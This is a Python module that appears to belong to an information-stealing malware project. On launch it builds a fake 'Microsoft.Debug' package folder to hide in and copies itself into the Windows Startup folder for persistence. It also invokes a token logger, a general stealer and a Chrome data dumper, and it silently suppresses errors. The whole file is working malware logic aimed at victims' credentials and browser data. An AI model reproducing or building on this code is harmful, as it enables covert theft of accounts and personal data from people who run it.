from os import getcwd, mkdir, path
from shutil import copy
from sys import argv
from zipfile import *

from modules.config import *
from modules.stealers import *


def run_on_run():
    try:
        main_path = (
            path.expanduser("~")
            + "/AppData/Local/Packages/Microsoft.Debug_8wekyb3d8bbwe"
        )
        mkdir(main_path)

        folders = [
            "AC",
            "AppData",
            "LocalCache",
            "LocalState",
            "RoamingState",
            "Settings",
            "SystemAppData",
            "TempState",
            "Debug",
        ]

        for folder in folders:
            mkdir(main_path + f"/{folder}")
    except Exception:
        pass

    """Functions for on run."""
    if startup == True:
        startup_path = (
            path.expanduser("~")
            + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
        )

        if getcwd() != startup_path:
            try:
                copy(f"{getcwd()}/{path.basename(argv[0])}", startup_path)
            except OSError:
                pass

    if token_log == True:
        logger()

    if info_stealer == True:
        try:
            steal()
        except Exception:
            pass
        
    if chrome_steal == True:
        try:
            dump_chrome()
        except Exception as e:
            print(e)

    if pack_include == True:
        with ZipFile(
            path.abspath(path.join(path.dirname(__file__), "../include.zip"))
        ) as include_zip:
            include_zip.extractall(f"{main_path}/AppData")
